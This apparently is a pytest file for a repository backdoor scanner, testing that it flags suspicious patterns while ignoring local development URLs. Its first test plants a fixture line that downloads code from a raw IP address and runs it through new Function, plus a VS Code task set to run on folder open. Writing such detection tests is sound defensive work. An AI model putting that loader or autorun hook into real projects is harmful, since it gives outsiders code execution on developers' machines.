from backdoor_watch.analysis.ioc_rules import load_rules
from backdoor_watch.analysis.source_scanner import SourceScanner
from backdoor_watch.domain.findings import Severity
from backdoor_watch.settings import Settings

SCANNER = SourceScanner(load_rules(Settings(port=0, token="").rules_path).source_patterns)


def _write_repo(tmp_path, files: dict[str, str]):
    for name, content in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return str(tmp_path)


def test_detects_remote_code_loader_and_vscode_autorun(tmp_path):
    root = _write_repo(tmp_path, {
        "server.js": 'axios.get("http://95.164.17.24:1224/api").then(r => new Function("require", r.data)(require));',
        ".vscode/tasks.json": '{"runOptions": {"runOn": "folderOpen"}}',
    })
    rules = {hit.rule_id for hit in SCANNER.scan(root, include_node_modules=False)}
    assert {"raw-ip-url", "function-constructor", "vscode-autorun"} <= rules


def test_local_dev_urls_are_not_reported(tmp_path):
    root = _write_repo(tmp_path, {"vite.config.ts": 'proxy: { "/api": "http://127.0.0.1:8765", lan: "http://192.168.1.5" }'})
    assert SCANNER.scan(root, include_node_modules=False) == []


def test_minimum_severity_filters_low_confidence_patterns(tmp_path):
    root = _write_repo(tmp_path, {"a.js": "const cp = require('child_process'); eval(x);"})
    assert SCANNER.scan(root, include_node_modules=False, minimum=Severity.HIGH) == []
    assert SCANNER.scan(root, include_node_modules=False) != []
